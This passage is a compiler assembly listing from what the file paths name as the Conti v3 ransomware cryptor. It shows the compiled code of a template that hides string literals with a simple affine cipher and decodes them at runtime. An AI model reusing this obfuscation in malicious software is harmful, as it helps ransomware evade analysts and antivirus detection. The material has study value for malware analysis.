  00036	8b c2		 mov	 eax, edx

; 76   :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 02	 sub	 eax, 2
  0002d	6b c0 0a	 imul	 eax, eax, 10
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 59	 imul	 eax, eax, 89		; 00000059H
  0002d	83 c0 02	 add	 eax, 2
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0c	 cmp	 QWORD PTR i$1[rbp], 12
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv182 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
